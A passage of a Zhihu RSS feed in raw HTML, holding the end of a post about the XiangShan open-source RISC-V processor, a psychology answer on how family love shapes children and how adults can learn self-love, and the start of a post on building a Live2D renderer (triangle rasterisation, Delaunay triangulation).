src=\"https://pic2.zhimg.com/v2-8ea1302a036d8ffc732aa1c226f339b8_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8ea1302a036d8ffc732aa1c226f339b8\" data-watermark-src=\"v2-793b94f8b0eec7f907f21f1d562bd5e3\" data-private-watermark-src=\"v2-8023bd1252eaa4120eb401c8f6a07ec5\"></p>\n<p>19. <b>我们有一个愿望——希望“香山”能存活30年；我们有一个约定——30年后再一起聚聚</b>，到时再看看香山会变成什么样。但是，要实现这个愿望，还有很多很多问题和挑战需要去解决。</p>\n<p>真诚地期待有更多伙伴加入香山的开发队伍！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b1603a84ecc4c42c91f0f33188c7fa7a_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b1603a84ecc4c42c91f0f33188c7fa7a\" data-watermark-src=\"v2-b96af9593681a914c73717477e1c6622\" data-private-watermark-src=\"v2-8a4397fa9b3223b2cd08eac29241c0de\"></p>\n<p>20. 香山是在<b>中科院计算所、鹏城实验室</b>的支持下，通过<b>中国开放指令生态（RISC-V）联盟</b>联合业界企业一起开发一款开源高性能RISC-V处理器核，也得到了<b>北京智源人工智能研究院</b>的支持。在此，要特别感谢<b>北京微核芯公司</b>的资深专家给予香山的开发强力的支持，他们非常认同开源理念，也是第一家与香山联合开发的企业。很高兴“南湖”架构的开发有了更多的合作伙伴，感谢对香山的支持。</p>\n<p>欢迎联系我们一起加入香山开源社区！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59071133192692ae413604a2189e9489_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-59071133192692ae413604a2189e9489\" data-watermark-src=\"v2-1ef4361d4c6191fc9ecb2e7cb82d4685\" data-private-watermark-src=\"v2-31afb68c844fef52a6cc59dd44865ca5\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-10552de2ba59e00f774123321f8b8f23_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"3000\" data-size=\"normal\" data-caption=\"香山团队部分成员在RISC-V中国峰会合影\" data-watermark=\"watermark\" data-original-src=\"v2-10552de2ba59e00f774123321f8b8f23\" data-watermark-src=\"v2-684fec7a3eaec7c13c325d6088f2e456\" data-private-watermark-src=\"v2-710c2dc279c00086328792dff2c65cd7\"></p>\n<h2>五、花絮</h2>\n<ul>\n<li>\n<b>一本关于香山的书</b>。很多人觉得CPU设计很难，很高大上，我们倒是希望能把这个门槛给降一降——所以打算出一本类似伯克利的《TCP/IP协议栈详解》和毛德操老师的《Linux内核源代码场景分析》那样的书，结合香山的源代码来分析CPU设计细节和诀窍（know-how）。这本书也可以用开源的方式由社区一起撰写，欢迎感兴趣的朋友一起参加。</li>\n<li>\n<b>“一生一芯”计划的回报</b>。首期“一生一芯”计划的五位同学（金越、王华强、王凯帆、张林隽、张紫飞）在本科一毕业便加入了香山的开发，成为了技术骨干。很多人都问他们什么时候毕业，可能需要再等等了。他们现在才研一，还要再等两年才会有同学毕业。</li>\n<li>\n<b>疫情中的封闭开发</b>。2020年6月初，北京新发地忽然出现了新冠疫情，导致同学们都无法回到北京。感谢深圳鹏城实验室的大力支持，整个团队全部集中到深圳，在鹏城实验室集中了三个月的封闭开发。那段时间基本上每周都有超过150个commit，反而成为开发效率最高的一个时间段。</li>\n<li>\n<b>香山的Logo</b>。我们尝试了很多个香山logo设计，最后经过大家投票选择了左下角的那个方案。不过有朋友好心告知香山的红叶主要是黄栌叶。好在香山也有五角枫，暂时就先定这个logo了。</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-b97c4c1e14d0e0cbcf9c894db122f3b0_720w.jpg?rss\" data-rawwidth=\"1972\" data-rawheight=\"968\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b97c4c1e14d0e0cbcf9c894db122f3b0\" data-watermark-src=\"v2-cf5f97f3924692117d5b4d690b8627b7\" data-private-watermark-src=\"v2-9f9e8e814fca2579b930d2ada4c89896\"></p>\n<hr>\n<h2>最后几句</h2>\n<p>有幸和阿里巴巴的戚总（戚肖宁）一起担任首届RISC-V中国峰会的联席大会主席，但其实幕后是中科院软件所和上海科技大学的老师们为这次峰会的筹备和保障工作付出了巨大的努力。</p>\n<p>由于疫情带来极大的不确定性，组委会始终保持高度紧张状态：一开始只开放了大约1500位线下参会名额，但很快就报满了；后来又开放了两次补报机会，但每次也只开放了200个名额，最后一共是2600人次（有的同时报名参加主会和分会）。</p>\n<p>但即使如此，最后因为广东那边的疫情原因，不得不安排大家远程参会。在此，对未能报上名的朋友说声抱歉，对报上名但因为疫情而选择放弃现场参会的朋友道声感谢。不过这次峰会提供了4个直播渠道，全程直播101个报告，并在后续会有视频回放。很抱歉直播中间也遇到了一些技术问题（有些上午调试好了下午还出错），在此再说声抱歉。</p>\n<p>特别感谢中科院软件所的吴伟老师和武延军老师，他们为筹备这次峰会而殚精竭虑，真的付出太多了。感谢上海科技大学信息学院周平强院长，协调上海本地各方资源，全力支持和保障峰会的顺利召开。也要感谢所有为峰会默默付出的筹备组成员和志愿者们！</p>\n<p>大家因RISC-V而汇聚到一起，正是因为RISC-V所带来的开源、开放、共享、共治是大家的共识，也是因为RISC-V为我们带来了无限的想象空间。如今，RISC-V已在中国蓬勃发展，中国也在RISC-V生态中贡献越来越多的力量——首届RISC-V中国峰会就是最好的写照。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bao-yun-gang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">包云岗</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">16 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/329960518?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">Intel公司在中国有芯片设计岗位吗？</a><br><a href=\"http://www.zhihu.com/question/278280318?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有了解广州粤芯半导体技术有限公司的吗？</a><br>\n","link":"http://www.zhihu.com/question/466393646/answer/1955410750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"充满爱的家庭能给孩子带来什么？这些能否通过后天获得？","date":"2021-06-22 23:00:10","description":"\n<p>一个有爱的家庭，就像一片丰富的土壤，能给一个人的成长提供持续且足够的滋养与力量。</p>\n<p>如果没有一个有爱的家庭，就需要成年的自己，主动获得爱的滋养，为其注入营养。</p>\n<p><br></p>\n<p>根据美国儿童研究组织Child Trends的说法，一方面，父母对孩子的温暖与爱会带来更高的自尊、更好的学习成绩、更好的亲子沟通以及更少的心理和行为问题。另一方面，没有慈爱父母的<b>孩子往往自尊心较低，感觉更加疏远、敌意、好斗和反社会。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f904f83415be2c9ff487510f28be5995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"854\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-f904f83415be2c9ff487510f28be5995\" data-watermark-src=\"v2-32289d6b6164d74dd6d441f762bfc86d\" data-private-watermark-src=\"v2-d405c66da1cb77eb3fcb6a4827471bf3\"></p>\n<p>下面我们来看一看相关研究。</p>\n<p><b>研究一：爱有助于孩子发展出稳定的情绪</b></p>\n<p>2010 年，杜克大学医学院的研究人员发现，拥有非常深情和细心的母亲的婴儿长大后会变得<b>更快乐、更有弹性、焦虑更少。[1]</b></p>\n<p>该研究涉及大约 500 人，他们从婴儿时期一直到 30 多岁。</p>\n<p>当婴儿八个月大时，心理学家观察了他们的母亲在他们进行了几次发育测试时与他们的互动。</p>\n<p>心理学家从“消极”到“饱满的爱”等五个程度对母亲的感情和关注程度进行了评估。近 10% 的母亲表现出低度的感情，85% 的母亲表现出正常的感情，约 6% 的母亲表现出高度的感情。</p>\n<p>30 年后，这些人接受了情绪健康的采访。</p>\n<p><b>母亲表现出“饱满的爱”或“爱抚”感情的成年人比其他人更不容易感到压力和焦虑。他们也不太可能报告敌意、令人痛苦的社交互动和心身症状。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e849fc3a02a4a35600e701ac0eb0201_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"853\" data-watermark=\"original\" data-original-src=\"v2-7e849fc3a02a4a35600e701ac0eb0201\" data-watermark-src=\"v2-da113f3a27b18042c5ab03b71d30f2bd\" data-private-watermark-src=\"v2-80da340cec6e711e7d83e25f761d0290\"></p>\n<p><b>研究二：爱有助于孩子的大脑发育</b></p>\n<p>大脑发育最重要的阶段是生命的开始，从子宫开始，然后是生命的第一年。到三岁时，儿童的大脑已达到其成人大小的近 90%。在此期间，这种快速的大脑生长和回路估计以每秒 700-1000 个突触连接的惊人速度发生。[2][3]</p>\n<p>婴儿与照顾者的经历对于这种早期脑回路的布线和修剪至关重要，并且良好的互动能够帮助婴儿在大脑中建立数以百万计的新突触连接。</p>\n<p><b>父母与孩子反复的互动和交流，会有助于提升孩子的记忆、建立关系的能力，同时能促进其逻辑发展。[4]</b></p>\n<p><br></p>\n<p><b>研究三：爱有助于孩子建立良好的依恋模式与关系</b></p>\n<p>在与人类接触极少的幸存“野蛮”儿童的悲惨案例研究表明，在缺乏爱、语言沟通的抚养的条件下，孩子的语言能力和情感发展能力会严重缺乏。</p>\n<p>另一项纵向研究报告称，对主要照顾者的不安全依恋可能会<b>显著削弱儿童在一生中形成和维持健康关系的能力。 [5]</b></p>\n<p>同时Teicher  报道了在早年遭受忽视（一种极端的不安全依恋形式）的儿童的以下病理状况[6]</p>\n<ul>\n<li> 左半球生长减慢，这可能会导致相关的抑郁症风险增加。</li>\n<li> 边缘​​系统的敏感性增加，这可能导致焦虑症。</li>\n<li> 可能导致学习和记忆障碍的海马体生长减少。</li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-cf9e86f17b227b7a4b74af4e5159f9d4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-cf9e86f17b227b7a4b74af4e5159f9d4\" data-watermark-src=\"v2-985cb8af8b9554ab842e5f31019e0609\" data-private-watermark-src=\"v2-a9fd5600a380ce7f0cbaffd8fe9d82b4\"></p>\n<p>通过以上列举的研究，我们不难发现一个人的情绪、建立关系的能力、安全感、患某些疾病的风险，都与童年时家庭是否有充足的爱有关。那是否如果我们没有成长在一个有爱的原生家庭里，我们后天就无法再改变了呢？</p>\n<p><br></p>\n<p>Margaret Paul 博士认为，以下的5步可以帮你学会爱自己，重建滋养出爱的土壤。[7]</p>\n<p><br></p>\n<p><b>第 1 步：愿意感受痛苦并对自己的感受负责。</b></p>\n<p>有意识地跟随你的呼吸，进入你的身体并拥抱你的所有感受。勇敢地体会你的感觉，例如，腹部有痉挛感、胸口闷时，体会这种身体感觉。不要试图用各种方法逃避感受，例如专注于你的头脑、评判自己、转向上瘾及麻木等。</p>\n<p><br></p>\n<p><b>第 2 步：了解你的情绪</b></p>\n<p>所有的感觉都是信息性的，提醒着你曾经发生了什么，有哪些创伤和问题还没有处理。</p>\n<p>致力于了解你的情绪，即使是那些可能让你痛苦的情绪，这样你才能开始采取爱的行动。</p>\n<p>试着为这些情绪命名、比如“焦虑”、“沮丧”、“愤怒”、“失望”，并细心了解它们什么时候出现、为什么出现、出现的形式与感觉等等。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5a6175e01708da6c1d82b59b1531df67_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"894\" data-watermark=\"original\" data-original-src=\"v2-5a6175e01708da6c1d82b59b1531df67\" data-watermark-src=\"v2-f4e36785f4559a343c8204021d3bb683\" data-private-watermark-src=\"v2-3604c464e20fcb98df0f3d98c2426611\"></p>\n<p><b>第 3 步：了解您的错误信念。</b></p>\n<p>第 3 步是一个深入而富有同情心的探索过程——了解你的信念和行为，以及可能导致你痛苦的人或情况是发生了什么。</p>\n<p>问问内在的感觉（内在感觉可能会以小男孩或小女孩的形象呈现）：“是什么导致了焦虑、抑郁、内疚、羞耻、嫉妒、愤怒、孤独或空虚的痛苦感觉？” 让答案来自内心，来自你的直觉和感受。</p>\n<p>一旦你了解了导致这些感觉的事件、想法、行为，问问你的自我关于导致自我放弃的想法和行为的恐惧和错误信念。</p>\n<p><br></p>\n<p><b>第4步：采取爱的行动</b></p>\n<p>有时人们认为“爱自己”是一种被召唤出来的感觉。看待爱自己的一个好方法是强调行动：<b>“我能做些什么来爱自己？</b>” ，而不是“我怎么能感受到对自己的爱？”</p>\n<p>比如，你觉得请自己吃大餐是爱自己，就去吃大餐，你觉得让伴侣给自己个拥抱是爱自己，就请求伴侣的拥抱。</p>\n<p>总之，落实到具体的行动上来爱自己。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-653c7ae6d9d90132e7733610395facfd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-653c7ae6d9d90132e7733610395facfd\" data-watermark-src=\"v2-a46001abf950678fd3e445b7047ff06c\" data-private-watermark-src=\"v2-b59ae966176d8f8275b6541a98101575\"></p>\n<p><b>第 5 步：评估您的行动并根据需要重新开始</b></p>\n<p>一旦你采取了爱的行动，检查一下你的痛苦、愤怒和羞耻是否得到了治愈。如果没有，你就会回到这些步骤，直到你发现真相和爱的行为，这些行为会给你带来平静、快乐和深刻的内在价值感。</p>\n<p>随着时间的推移，你会发现爱自己会改善你生活中的一切——你的人际关系、你的健康和幸福、你实现梦想的能力以及你的自尊。。</p>\n<p>爱自己并与自己建立联系是能够爱他人并与他人建立联系并建立爱的关系的关键。爱自己是创造热情、充实和快乐生活的关键。</p>\n<p><br></p>\n<p>爱与被爱对于每个孩子、每个成年人来说，都是至关重要的事情。</p>\n<p>我想请你相信一件非常重要的事情：<b>小时候的爱或许并不充足，但这并不意味着爱不存在，也不意味着长大后的我们不能去获取爱、学习爱。</b></p>\n<p>我很喜欢仓央嘉措的几句诗：你爱，或者不爱我，爱就在那里，不增不减。</p>\n<p>爱是一种能力，只要你想要去学习，就一定能学会、能获得。</p>\n<p><br></p>\n<p>关注 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/dee99bcf9da2172a7de2ce90a5f64542\" data-hash=\"dee99bcf9da2172a7de2ce90a5f64542\" data-hovercard=\"p$b$dee99bcf9da2172a7de2ce90a5f64542\">@壹心理</a> ，我们用专业的心理学知识、人性的爱与温度，陪伴你的心灵成长</p>\n<p>世界和我爱着你~</p>\n<p><br></p>\n<blockquote>参考资料：<br>[1]<a href=\"http://link.zhihu.com/?target=https%3A//www.mother.ly/child/how-a-parents-affection-shapes-a-childs-happiness-for-life\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mother.ly/child/how-a-p</span><span class=\"invisible\">arents-affection-shapes-a-childs-happiness-for-life</span><span class=\"ellipsis\"></span></a><br>[2]Perry BD. Traumatized children: how childhood trauma influences brain development. <i>J. California Alliance Mentally Ill. </i>2000;11:48–51<br>[3]Rethinking evidence-based practice and two-generation programs to create the future of early childhood policy.<br>[4]Shore R. <i>Rethinking the brain.</i> New York, NY: Families and Work Institute; 1997.<br>[5]Perry BD. Vol. 3. Brain and mind; 2002. Childhood experience and the expression of genetic potential: what childhood neglect tells us about nature and nurture; pp. 79–100.<br>[6]Teicher MD. Wounds that time won’t heal: the neurobiology of child abuse. <i>Cerebrum: The Dana Forum on brain science. </i>2000;2:50–67<br>[7]<a href=\"http://link.zhihu.com/?target=https%3A//www.mindbodygreen.com/0-15295/how-do-you-actually-learn-to-love-yourself.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">mindbodygreen.com/0-152</span><span class=\"invisible\">95/how-do-you-actually-learn-to-love-yourself.html</span><span class=\"ellipsis\"></span></a>\n</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yi-xin-li-1?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">壹心理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">104 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/318331653?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">家庭对于孩子来说影响多大，又如何能够自我救赎？</a><br><a href=\"http://www.zhihu.com/question/451806172?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在的家庭已经不再是很多人的避风港呢？</a><br>\n","link":"http://www.zhihu.com/question/465547566/answer/1954604848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"想问一下制作live 2D困难吗？","date":"2021-06-22 11:30:10","description":"\n<p>第一次看到live2D估计是群里看到的,第一次看的感觉就是这个动画看起来很奇怪,有点粗糙,搞不懂这种动画怎么都能火,不过看了一段时间以后,简直是越看越顺眼,在今年1月份的时候,萌生了自己也来做一个live2D的想法,没错,你没看错,这里指的是制作live2D,不是制作live2D模型</p>\n<p>这里的制作live2D指的是,实现live2D的基础动画功能,完整实现其骨骼,动作追踪,网格建立,物理模拟到图元光栅化操作.</p>\n<p>其实说困难吧,也不太困难,说不困难吧,算算也将近花了5个月时间来做.</p>\n<p>这么一听瞬间高大上了是不是.</p>\n<p>为了方便调试,我预先绘制了一个调试用的人设,这部分用sai就可以了</p>\n<p>1.打个线稿</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ed24c3b2382cfcfb3dd254bf5fa5c347_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1127\" data-rawheight=\"803\" data-watermark=\"watermark\" data-original-src=\"v2-ed24c3b2382cfcfb3dd254bf5fa5c347\" data-watermark-src=\"v2-eac05329ec218cca187fe7eaa52c56dc\" data-private-watermark-src=\"v2-004b1a8e8046eb2ded9fa13b61d3d8cc\"></p>\n<p>2.调整一下,上个涩</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c25cd7aa4f23b229a1afdf5b68c43717_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1122\" data-rawheight=\"802\" data-watermark=\"watermark\" data-original-src=\"v2-c25cd7aa4f23b229a1afdf5b68c43717\" data-watermark-src=\"v2-3e54766af5d9120fb5fe5b55896d0b04\" data-private-watermark-src=\"v2-ea45c68906fbd8bd30419afa3dbcd688\"></p>\n<p>3.最麻烦的一步,将每一个图层,导出为独立的png图片</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d251868b120821f2aa47c04cc554794f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"549\" data-watermark=\"watermark\" data-original-src=\"v2-d251868b120821f2aa47c04cc554794f\" data-watermark-src=\"v2-06937a6572a097a0f9b1e4a3f1ed2a50\" data-private-watermark-src=\"v2-af197acbb972dc2007c0524f8f007d1d\"></p>\n<p>准备工作完成,启动Visual Studio</p>\n<p><img src=\"https://pic4.zhimg.com/v2-278600e15f2597b8b94a72675bd08ac7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"520\" data-rawheight=\"263\" data-watermark=\"watermark\" data-original-src=\"v2-278600e15f2597b8b94a72675bd08ac7\" data-watermark-src=\"v2-4fcffb1fecdb5ef2bd29caca2f3a361c\" data-private-watermark-src=\"v2-6e740595a979273423d7dc99203845f7\"></p>\n<p>现在,我们可以开始来愉快的做live2D了</p>\n<p>为此,我们先请出我们可爱的大学本科期间的一本基础教材&lt;&lt;计算机图形学&gt;&gt;来开始我们Live2D的基础原理说明</p>\n<p><img src=\"https://pic4.zhimg.com/v2-56e7337051f3e339414855d1a6112aad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"446\" data-watermark=\"watermark\" data-original-src=\"v2-56e7337051f3e339414855d1a6112aad\" data-watermark-src=\"v2-ba4fe8a5db683031badadb6c190a68d0\" data-private-watermark-src=\"v2-1f7abad767d8e0180ae341752fc2c02d\"></p>\n<p>我们先来复习一下图形学的基础</p>\n<p>首先,我们先对图元做个定义</p>\n<ol>\n<li>live2D的所有图形由图元分割</li>\n<li>每个图元,由三个不共线的顶点构成,为一个三角形</li>\n<li>每个顶点包含x,y坐标,每个由一个float32存储</li>\n<li>每个顶点包含u,v纹理坐标,每个坐标范围为0-1.0f,超出范围的坐标视为无效映射坐标,每个由一个float32存储.</li>\n<li>每个顶点包含一个法向量,表示该顶点所处图元的法向量,法向量由一个x,y,z组成,每个由一个float32存储</li>\n</ol>\n<p>上面是图形学渲染中一个非常常用的结构,因为在渲染的过程中,live2D的模型不需要额外的投影变换矩阵进行顶点隐射(或者说使用了仿射变换),也不需要额外的ZBuffer来维护每个顶点的深度(因为我直接使用图层的方式对每个live2D图像进行管理,因此我直接使用画家算法对图层进行先后绘制即可),因此,我们可以将重点放在图元如何进行渲染中来.</p>\n<p>幸好这也并不是什么很复杂的事情,我们直接使用扫描线填充算法来填充图元就可以了</p>\n<p><img src=\"https://pic1.zhimg.com/v2-12022448a2d9c65c08a5079cdb8290b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"316\" data-rawheight=\"205\" data-watermark=\"watermark\" data-original-src=\"v2-12022448a2d9c65c08a5079cdb8290b7\" data-watermark-src=\"v2-4022ac8df72fc20ad66491d5b6064dbd\" data-private-watermark-src=\"v2-3acc774c68f73eaca1d0a06192fa8144\"></p>\n<p>对应伪代码如下</p>\n<p>1.首先我们先计算扫描线的y坐标,设 <img src=\"https://www.zhihu.com/equation?tex=y%5E%7B%27%7D\" alt=\"y^{'}\" eeimg=\"1\"> 是一个整数,那么 <img src=\"https://www.zhihu.com/equation?tex=y%3Dy%5E%7B%27%7D%2B0.5\" alt=\"y=y^{'}+0.5\" eeimg=\"1\"></p>\n<p>2.计算直线 <img src=\"https://www.zhihu.com/equation?tex=y%3Dn_i\" alt=\"y=n_i\" eeimg=\"1\"> 与图元三角形左右交点</p>\n<p>3.从左交点开始,逐一计算其映射的 <img src=\"https://www.zhihu.com/equation?tex=%28u%2Cv%29\" alt=\"(u,v)\" eeimg=\"1\"> 坐标,并用该坐标映射到纹理中的像素,绘制扫描线</p>\n<p>因此,当我们加载一个图形到live2D的项目中,其最终会依据一个2D图元的方式将图像最终显示出来</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2d79ee82a3c26f7e1ec27f29d139915a_720w.jpg?rss\" data-caption=\"纹理贴图(未绑定图元以前)\" data-size=\"normal\" data-rawwidth=\"761\" data-rawheight=\"434\" data-watermark=\"watermark\" data-original-src=\"v2-2d79ee82a3c26f7e1ec27f29d139915a\" data-watermark-src=\"v2-c7eae9a6a3780bdec179946599748ee0\" data-private-watermark-src=\"v2-c5d48032df9780bf8fc387f41a3bf509\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6d1e541cd90d9d92e605b2312f54a41a_720w.jpg?rss\" data-caption=\"绑定了图元后\" data-size=\"normal\" data-rawwidth=\"756\" data-rawheight=\"391\" data-watermark=\"watermark\" data-original-src=\"v2-6d1e541cd90d9d92e605b2312f54a41a\" data-watermark-src=\"v2-c19defbde1e94299b9e446b07a145770\" data-private-watermark-src=\"v2-fc5e344f0213547353dad9bfdebb220a\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0ae967c8c231df297ffc5973311ad94b_720w.jpg?rss\" data-caption=\"由2个图元来完整组成该图形\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-0ae967c8c231df297ffc5973311ad94b\" data-watermark-src=\"v2-e224798681f945b76cc7f2fcf887a164\" data-private-watermark-src=\"v2-af94dc3061ac4da208ce8870d51ea988\"></p>\n<p>需要值得一提的是,为了进一步提高图元的渲染质量,在进行u,v纹理坐标隐射之前,笔者使用了双线性插值滤波,对纹理映射关系进一步处理</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39e00a24e9186ac03295f583d2ab88a1_720w.jpg?rss\" data-caption=\"未使用插值滤波\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"372\" data-watermark=\"watermark\" data-original-src=\"v2-39e00a24e9186ac03295f583d2ab88a1\" data-watermark-src=\"v2-038ff414fd4c95d17f9a64d20695c120\" data-private-watermark-src=\"v2-f9cedc3af49e2d85a812ffbb81bf74e8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-440735723198cae98f939fd8e3c36d04_720w.jpg?rss\" data-caption=\"使用了插值滤波\" data-size=\"normal\" data-rawwidth=\"378\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-440735723198cae98f939fd8e3c36d04\" data-watermark-src=\"v2-8879bef879373d9a3fbe84ba5b9c7fee\" data-private-watermark-src=\"v2-bf7e9a0a753d89f6d750c9a0f3e29487\"></p>\n<p>图元(三角形)的填充算法,在Live2D的渲染过程中,图元填充(纹理映射)是整个live2D项目的基石,在完成这一个关键步骤之后,所有的变换,都可以通过一些列的平移,旋转,缩放矩阵的级联并最终应用于顶点变换来完成.</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b1901ed42f97460e8d2fed8853e45fb_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"322\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-0b1901ed42f97460e8d2fed8853e45fb\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>到了这一步,我们将之前绘制好的所有图层加载进来,并准备为每一个图层设定网格(mesh)</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f5965026ede29f9997c2859bf16da37f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-f5965026ede29f9997c2859bf16da37f\" data-watermark-src=\"v2-1ae21954f6a9cdaa7082adb8fe88b0d7\" data-private-watermark-src=\"v2-a250ab4b344e091956b49e8e39ff26c3\"></p>\n<p>到此,除了为每一个图层设定一个z坐标外,首当其冲要解决的是网格建立的问题,为此,不得不聊一聊著名的Delaunary三角剖分</p>\n<p>先来看看定义部分(来自百度百科)</p>\n<p>【定义】三角剖分：假设 <img src=\"https://www.zhihu.com/equation?tex=V\" alt=\"V\" eeimg=\"1\"> 是二维实数域上的有限点集，边 <img src=\"https://www.zhihu.com/equation?tex=e\" alt=\"e\" eeimg=\"1\"> 是由点集中的点作为端点构成的封闭线段， <img src=\"https://www.zhihu.com/equation?tex=E\" alt=\"E\" eeimg=\"1\"> 为 <img src=\"https://www.zhihu.com/equation?tex=e\" alt=\"e\" eeimg=\"1\"> 的集合。那么该点集 <img src=\"https://www.zhihu.com/equation?tex=V\" alt=\"V\" eeimg=\"1\"> 的一个三角剖分 <img src=\"https://www.zhihu.com/equation?tex=T%3D%28V%2CE%29\" alt=\"T=(V,E)\" eeimg=\"1\"> 是一个平面图 <img src=\"https://www.zhihu.com/equation?tex=G\" alt=\"G\" eeimg=\"1\"> ,该平面图满足条件：</p>\n<p>1、除了端点，平面图中的边不包含点集中的任何点。</p>\n<p>2、没有相交边。（边和边没有交叉点）</p>\n<p>3、平面图中所有的面都是三角面，且所有三角面的合集是散点集V的凸包。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-482a248ac38cc7bb046b6ca9e520ba01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"366\" data-rawheight=\"138\" data-watermark=\"watermark\" data-original-src=\"v2-482a248ac38cc7bb046b6ca9e520ba01\" data-watermark-src=\"v2-0479a64e9f50a13e67fd39980f3b8c02\" data-private-watermark-src=\"v2-d16e7753a96bb718b9ad002524097bb0\"></p>\n<p>要满足Delaunay三角剖分的定义，必须符合两个重要的准则：</p>\n<p>1、空圆特性：Delaunay三角网是唯一的（任意四点不能共圆），在Delaunay三角形网中任一三角形的外接圆范围内不会有其它点存在。如下图所示：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-372e0200ce1f8e241e18b208d33ade02_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"267\" data-rawheight=\"289\" data-watermark=\"watermark\" data-original-src=\"v2-372e0200ce1f8e241e18b208d33ade02\" 